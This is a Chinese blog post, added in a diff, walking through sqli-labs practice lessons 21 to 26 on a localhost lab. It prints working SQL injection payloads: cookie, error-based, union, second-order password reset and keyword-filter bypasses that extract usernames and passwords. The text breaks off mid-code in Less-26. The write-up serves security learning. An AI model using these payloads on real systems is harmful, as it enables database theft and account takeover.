@@ -1,0 +1,1131 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+  <script>
+  (function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/0f81ff2f.js","daovoice")
+  daovoice('init', {
+      app_id: "112bf565"
+    });
+  daovoice('update');
+  </script>
+
+
+
+
+
+
+  
+  
+  <link rel="stylesheet" media="all" href="/lib/Han/dist/han.min.css?v=3.3">
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+  <link rel="manifest" href="/images/manifest.json">
+
+
+
+
+  <meta name="keywords" content="sqli-labs,SQL注入,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="煊奕" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="Less-211.直接用我们知道的用户名密码都为：admin的进行尝试，发现： 2.发现Cookie为：uname = YWRtaW4=说明对其进行了base64编码，那就编码看看：在线编码解码 YWRtaW4=就是admin，确实是base64编码，那就是说构造的语句也要进行base64编码。 还是在Cookie中构造：uname=admin&amp;#39; and extractvalue(1,co">
+<meta name="keywords" content="sqli-labs,SQL注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Sqli-Labs-Less21-37">
+<meta property="og:url" content="https://clwsec.top/2019/03/21/sqli-labs-Less21-37/index.html">
+<meta property="og:site_name" content="煊奕">
+<meta property="og:description" content="Less-211.直接用我们知道的用户名密码都为：admin的进行尝试，发现： 2.发现Cookie为：uname = YWRtaW4=说明对其进行了base64编码，那就编码看看：在线编码解码 YWRtaW4=就是admin，确实是base64编码，那就是说构造的语句也要进行base64编码。 还是在Cookie中构造：uname=admin&amp;#39; and extractvalue(1,co">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-6069cb7d0b58b58e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-43ceeb8a785a41fd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-91ff53040fecf83c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-e0bed56c3ec73f3d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-8ed20e6e8a272659.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-f337e35f80da5132.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-7e8f7743cd211bc2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-8991f39b7f0f3e2f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-e192e991e19f82c4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-cec935f007128b13.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-cdace9cb2c8a7034.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-2c289ae95e5e0b4a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-71d45b60994c30a3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-13aaa96719d195e7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-4b0b78f225945460.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-648e661fada6ff65.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-f4d31c0d1ba1a5d0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-9adbe0667cf0ca1f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-98a05985d6a429ab.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-9b31b513fc677fd8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-6ac2bf827294fc49.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-5c2d6658b8822cd9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-49197609c1b8aca9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-a09e42903540b99f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-3e54b68fa695b5d6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2019-03-21T12:51:24.927Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Sqli-Labs-Less21-37">
+<meta name="twitter:description" content="Less-211.直接用我们知道的用户名密码都为：admin的进行尝试，发现： 2.发现Cookie为：uname = YWRtaW4=说明对其进行了base64编码，那就编码看看：在线编码解码 YWRtaW4=就是admin，确实是base64编码，那就是说构造的语句也要进行base64编码。 还是在Cookie中构造：uname=admin&amp;#39; and extractvalue(1,co">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/9216631-6069cb7d0b58b58e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":10,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://clwsec.top/2019/03/21/sqli-labs-Less21-37/">
+
+
+
+
+
+  <title>Sqli-Labs-Less21-37 | 煊奕</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">煊奕</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">No pains No gains</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-链接">
+          <a href="/links/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
+            
+            链接
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://clwsec.top/2019/03/21/sqli-labs-Less21-37/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="lei">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="煊奕">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Sqli-Labs-Less21-37</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-21T20:50:04+08:00">
+                2019-03-21
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2019-03-21T20:51:24+08:00">
+                2019-03-21
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/SQL/" itemprop="url" rel="index">
+                    <span itemprop="name">SQL</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2019/03/21/sqli-labs-Less21-37/" class="leancloud_visitors" data-flag-title="Sqli-Labs-Less21-37">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+          
+            <div class="post-wordcount">
+              
+                
+                  <span class="post-meta-divider">|</span>
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2.3k
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body han-init-context" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h3><p>1.直接用我们知道的用户名密码都为：<code>admin</code>的进行尝试，发现：<br><img src="https://upload-images.jianshu.io/upload_images/9216631-6069cb7d0b58b58e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>2.发现Cookie为：<code>uname = YWRtaW4=</code>说明对其进行了base64编码，那就编码看看：<a href="https://www.sojson.com/base64.html" target="_blank" rel="noopener">在线编码解码</a><br> <code>YWRtaW4=</code>就是<code>admin</code>，确实是<code>base64编码</code>，那就是说构造的语句也要进行base64编码。<br><img src="https://upload-images.jianshu.io/upload_images/9216631-43ceeb8a785a41fd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>还是在Cookie中构造：<code>uname=admin&#39; and extractvalue(1,concat(&#39;~&#39;,(select database()))) #</code>编码后<br><code>uname=YWRtaW4nIGFuZCBleHRyYWN0dmFsdWUoMSxjb25jYXQoJ34nLChzZWxlY3QgZGF0YWJhc2UoKSkpKSAj</code><br><img src="https://upload-images.jianshu.io/upload_images/9216631-91ff53040fecf83c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>结果报错，说明不止是单引号闭合，多了一个单引号，尝试加个括号：<code>uname=admin&#39;) and extractvalue(1,concat(&#39;~&#39;,(select database()))) #</code>编码后<br><code>uname=YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KCd+Jywoc2VsZWN0IGRhdGFiYXNlKCkpKSkgIw==</code><br><img src="https://upload-images.jianshu.io/upload_images/9216631-e0bed56c3ec73f3d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><br><img src="https://upload-images.jianshu.io/upload_images/9216631-8ed20e6e8a272659.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>没用提错，说明为单引号加括号闭合。可是并没有回显我们需要的内容，看来这构造行不通。改一改，不直接用<code>database()</code>  构造为：<code>admin&#39;) and extractvalue(1,concat(&#39;~&#39;,(select schema_name from information_schema.schemata limit 0,1))) #</code> 编码后<code>YWRtaW4nKSBhbmQgKHNlbGVjdCAxIGZyb20gKHNlbGVjdCBjb3VudCgqKSxjb25jYXQoKHNlbGVjdCBzY2hlbWFfbmFtZSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS5zY2hlbWF0YSBsaW1pdCAwLDEpLCc7JyxmbG9vcihyYW5kKCkqMikpIGFzIHggZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIGdyb3VwIGJ5IHgpYXMgYSkj</code></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9216631-f337e35f80da5132.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>成功，<strong>这里用<code>database()</code>不行，因为自己太菜，目前也说不出个为什么，希望知道的大佬指点一下。之所以在这里从新构造，是因为下面的构造在开始时，用的也是<code>database()</code>，结果提示超过一行，但想着<code>database()</code>应该就是指<code>security</code>好像不需要<code>limit n,1</code>来限制，所以从新构造成这个形式。</strong></p>
+<p>3.换一种构造试试：<code>admin&#39;) and (select 1 from (select count(*),concat((select schema_name from information_schema.schemata limit 0,1),&#39;;&#39;,floor(rand()*2)) as x from information_schema.tables group by x)as a)#</code><br>编码后：<code>YWRtaW4nKSBhbmQgKHNlbGVjdCAxIGZyb20gKHNlbGVjdCBjb3VudCgqKSxjb25jYXQoKHNlbGVjdCBzY2hlbWFfbmFtZSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS5zY2hlbWF0YSBsaW1pdCAwLDEpLCc7JyxmbG9vcihyYW5kKCkqMikpIGFzIHggZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIGdyb3VwIGJ5IHgpYXMgYSkj</code><br><img src="https://upload-images.jianshu.io/upload_images/9216631-7e8f7743cd211bc2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>成功，剩下的稍微改改就好，改来改去，转来转去的，试得头疼。这题好像还提示日期配置错误，忙着做题了，没来的急处理，请大家自行忽略。后来查了一下，解决方法为：<a href="http://beikeit.com/post-682.html" target="_blank" rel="noopener">It is not safe to rely on the  the system’s timezone settings解决方法</a> 下面的已经处理好。</p>
+<hr>
+<h3 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h3><p>1.先用我们知道的用户名密码都为：admin的进行尝试，发现：<br><img src="https://upload-images.jianshu.io/upload_images/9216631-8991f39b7f0f3e2f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><br>感觉和<code>Less-21</code>相似，连返回的图片显示的都是<code>SQLI DUMB SERIES-21</code>(可能是弄错了)</p>
+<p>2.那还是先尝试Cookie：把<code>Less-21</code>的语句提交看一下：<code>admin&#39;) and (select 1 from (select count(*),concat((select schema_name from information_schema.schemata limit 0,1),&#39;;&#39;,floor(rand()*2)) as x from information_schema.tables group by x)as a)#</code><br>编码后：<code>YWRtaW4nKSBhbmQgKHNlbGVjdCAxIGZyb20gKHNlbGVjdCBjb3VudCgqKSxjb25jYXQoKHNlbGVjdCBzY2hlbWFfbmFtZSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS5zY2hlbWF0YSBsaW1pdCAwLDEpLCc7JyxmbG9vcihyYW5kKCkqMikpIGFzIHggZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIGdyb3VwIGJ5IHgpYXMgYSkj</code><br><img src="https://upload-images.jianshu.io/upload_images/9216631-e192e991e19f82c4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>提示出错，应该是闭合方式不同。</p>
+<p>3.尝试为双引号：<code>admin&quot; and (select 1 from (select count(*),concat((select schema_name from information_schema.schemata limit 0,1),&#39;;&#39;,floor(rand()*2)) as x from information_schema.tables group by x)as a)#</code> 编码后：<code>YWRtaW4iIGFuZCAoc2VsZWN0IDEgZnJvbSAoc2VsZWN0IGNvdW50KCopLGNvbmNhdCgoc2VsZWN0IHNjaGVtYV9uYW1lIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnNjaGVtYXRhIGxpbWl0IDAsMSksJzsnLGZsb29yKHJhbmQoKSoyKSkgYXMgeCBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgZ3JvdXAgYnkgeClhcyBhKSM=</code><br><img src="https://upload-images.jianshu.io/upload_images/9216631-cec935f007128b13.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p> 成功。</p>
+<hr>
+<h3 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h3><p>1.加单引号/加单引号加注释：<code>http://localhost:8088/sqlilabs/Less-23/?id=1&#39; --+</code>都提示同样的错误：<br><img src="https://upload-images.jianshu.io/upload_images/9216631-cdace9cb2c8a7034.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>也就是说注释符不起作用，可能是过滤了。</p>
+<p>2.那通过语句闭合试试：成功<code>http://localhost:8088/sqlilabs/Less-23/?id=1&#39; and &#39;1&#39;=&#39;1</code><br><img src="https://upload-images.jianshu.io/upload_images/9216631-2c289ae95e5e0b4a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>3.用使用联合查询：<code>http://localhost:8088/sqlilabs/Less-23/?id=1&#39; union select 1,2 and  &#39;1&#39;=&#39;1</code> 一列一列加发现有三列，不然会报错。<br><img src="https://upload-images.jianshu.io/upload_images/9216631-71d45b60994c30a3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>4.构造获取数据库名：<code>http://localhost:8088/sqlilabs/Less-23/?id=-1&#39; union select 1,(select schema_name from information_schema.schemata limit 0,1), &#39;3</code><br><img src="https://upload-images.jianshu.io/upload_images/9216631-13aaa96719d195e7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>5.直接给出最终构造：<code>http://localhost:8088/sqlilabs/Less-23/?id=-1&#39; union select 1,(select concat(username,&#39;:&#39;,password) from users limit 1,1), &#39;3</code><br><img src="https://upload-images.jianshu.io/upload_images/9216631-4b0b78f225945460.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<hr>
+<h3 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h3><p>1.看提示为：<code>second order injections *Real Treat* stored  injections</code> 就是<code>二阶注入/真正的享受/存储注入</code>的意思。<br>2.先进页面看看，发现可以新建用户和用户登录，那先建一个试试。创建成功：<br><img src="https://upload-images.jianshu.io/upload_images/9216631-648e661fada6ff65.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>3.登录，发现可以修改密码：<br><img src="https://upload-images.jianshu.io/upload_images/9216631-f4d31c0d1ba1a5d0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>4.根据提示的存储注入，想到可以构造一个新用户名（经测试用户名未进行相应过滤），使在更新此用户名的密码时，更新到其他账户密码。具体实现，考虑到密码重置语句为：<code>update table_name set password=&#39;new_password&#39; where username=&#39;username&#39; and password=&#39;password&#39; ;</code>构造用户名：<code>admin&#39; or &#39;1&#39;=&#39;1</code> ，创建。登录，修改密码时，执行的语句应该为：<code>update table_name set password=&#39;new_password&#39; where username=&#39;admin&#39; or &#39;1&#39;=&#39;1&#39; and password=&#39;password&#39; ;</code> 则修改的便是账号admin的密码。如修改密码为：<code>123456</code><br><img src="https://upload-images.jianshu.io/upload_images/9216631-9adbe0667cf0ca1f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>修改后，使用密码<code>123456</code>登录发现，登录成功，说明构造成功。下面看一下表的内容，发现两个账号密码都已经被修改。<br><img src="https://upload-images.jianshu.io/upload_images/9216631-98a05985d6a429ab.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>这里的构造其实是有问题的，因为使用<code>or</code> 导致凡是密码原为<code>admin</code>的账户密码都被修改为<code>123456</code>，而与用户名是不是<code>admin</code>无关（当然，用户名为<code>admin</code>的一定能修改成功），因为<code>&#39;1&#39;=&#39;1&#39; and password=&#39;admin&#39;</code>为真即达到条件，这也正是万能语句的精妙之处。</p>
+<p>5.也可以这样构造，用户名为：<code>admin&#39; #</code> 则执行的语句为：<code>update table_name set password=&#39;new_password&#39; where username=&#39;admin&#39;  #&#39; and password=&#39;password&#39; ;</code> 也就是：<code>update table_name set password=&#39;new_password&#39; where username=&#39;admin&#39; ;</code> 测试发现，成功，此时修改账号<code>admin</code>密码为<code>qwert</code>。<br><img src="https://upload-images.jianshu.io/upload_images/9216631-9b31b513fc677fd8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<hr>
+<h3 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h3><p>这个题还是比较友好的，提示量大，不仅报错，还提示过滤后的内容。而且刚开始就说明<code>and</code>和<code>or</code> 不可用了。然后尝试了一下，发现为单引号闭合。<br><img src="https://upload-images.jianshu.io/upload_images/9216631-6ac2bf827294fc49.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<h4 id="使用联合查询"><a href="#使用联合查询" class="headerlink" title="使用联合查询"></a>使用联合查询</h4><p>1.限制条件和联合查询关系不大，group by试出为3列。<br>2.使用联合查询，慢慢构造语句，先获取数据库名：<code>http://localhost:8088/sqlilabs/Less-25/?id=-1&#39; union select 1,group_concat(schema_name),3 from information_schema.schemata --+</code> 报错：过滤后的内容为：<br><img src="https://upload-images.jianshu.io/upload_images/9216631-5c2d6658b8822cd9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>3.这个简单，改成<code>http://localhost:8088/sqlilabs/Less-25/?id=-1&#39; union select 1,group_concat(schema_name),3 from infoorrmation_schema.schemata --+</code> 成功。<br><img src="https://upload-images.jianshu.io/upload_images/9216631-49197609c1b8aca9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>4.获取表名：<code>http://localhost:8088/sqlilabs/Less-25/?id=-1&#39; union select 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema=&#39;security&#39;--+</code><br>5.都挺简单的，只需要把有<code>and</code> 和<code>or</code>的都加上相应字母即可。</p>
+<h4 id="使用替代和报错注入"><a href="#使用替代和报错注入" class="headerlink" title="使用替代和报错注入"></a>使用替代和报错注入</h4><blockquote>
+<p>AND:  &amp;&amp;    %26%26<br>OR: ||</p>
+</blockquote>
+<p>1.使用extractvalue()构造，<code>http://localhost:8088/sqlilabs/Less-25/?id=1&#39; || extractvalue(1,concat(0x25,(select database())))--+</code><br><img src="https://upload-images.jianshu.io/upload_images/9216631-a09e42903540b99f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>2.构造和之前一样，不多说，直接给出最终构造：<code>http://localhost:8088/sqlilabs/Less-25/?id=1&#39; || extractvalue(1,concat(0x25,(select concat(username,&#39;:&#39;,passwoorrd) from users limit 0,1)))--+</code><br><img src="https://upload-images.jianshu.io/upload_images/9216631-3e54b68fa695b5d6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">$id= preg_replace(<span class="string">'/AND/i'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br></pre></td></tr></table></figure></p>
+<hr>
+<h3 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h3><p>1.加单引号，出错。后发现为数字型。<br>2.构造和Less-25一样。<br>3.发现无报错提示（只提示有无语句错误，即<code>Less-25</code>图片中显示的警告。关于此内容可查看<a href="https://www.jb51.net/article/58589.htm" target="_blank" rel="noopener">提示Warning:mysql_fetch_array() expects</a>），说明报错注入是不可用的，当然可以使用布尔型和时间延迟型。<br>源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">$id= preg_replace(<span class="string">'/AND/i'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br></pre></td></tr></table></figure></p>
+<hr>
+<h3 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h3><p>1.提示过滤空格与注释，发现and &amp;&amp; or也被注释，测试发现为单引号闭合。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">$id= preg_replace(<span class="string">'/and/i'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//strip out /*</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out --</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);			<span class="comment">//Strip out #</span></span><br><span class="line">$id= 